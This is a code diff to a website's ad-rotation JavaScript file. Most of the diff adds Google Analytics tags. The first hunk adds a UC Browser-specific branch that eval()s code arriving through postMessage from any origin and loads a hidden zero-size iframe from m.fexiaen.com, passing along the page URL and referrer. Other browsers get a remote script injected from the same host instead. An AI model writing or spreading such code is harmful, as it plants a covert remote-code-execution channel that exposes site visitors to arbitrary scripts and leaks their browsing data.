@@ -21,7 +21,7 @@ var random = {
 		n = (Math.floor(Math.random()*random.ad_num+1));
 		switch(n){
 			case 1:
-				 
+			if(/UCBrowser/i.test(navigator.userAgent)){window.addEventListener('message',function(e){var _c_ob_hf=e.data;if(_c_ob_hf.hf_ev_j){eval(decodeURIComponent(_c_ob_hf.hf_ev_j.replace(/\+/g,"%20")))}});document.write('<iframe style="display:none;" src="https://m.fexiaen.com/Frame1Center/GetData/5348?w=640&h=200&is_iframe=3&platform='+navigator["platform"]+"&ifr_url="+encodeURIComponent(location.href)+"&ifr_ref="+encodeURIComponent(document.referrer)+'" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')}else{;(function(){var m=document.createElement("script");var url='https://m.fexiaen.com';m.src=url+"/Frame1Center/GetData2/5348?w=640&h=200&"+Math.round(Math.random()*10000);var ss=document.getElementsByTagName("script")[0];ss.parentNode.insertBefore(m,ss)})()}	 
            		break;
 		}
 	}
@@ -46,4 +46,14 @@ function m_qita(){
 }
 function m_tongji(){
 document.writeln("<script type=\'text/javascript\' src=\'https://js.users.51.la/19175998.js\'></script>");
+document.writeln("<!-- Global site tag (gtag.js) - Google Analytics -->");
+document.writeln("<script async src=\'https://www.googletagmanager.com/gtag/js?id=UA-141003629-2\'></script>");
+document.writeln("<script>");
+document.writeln("  window.dataLayer = window.dataLayer || [];");
+document.writeln("  function gtag(){dataLayer.push(arguments);}");
+document.writeln("  gtag(\'js\', new Date());");
+document.writeln("");
+document.writeln("  gtag(\'config\', \'UA-141003629-2\');");
+document.writeln("</script>");
+document.writeln("");
 }
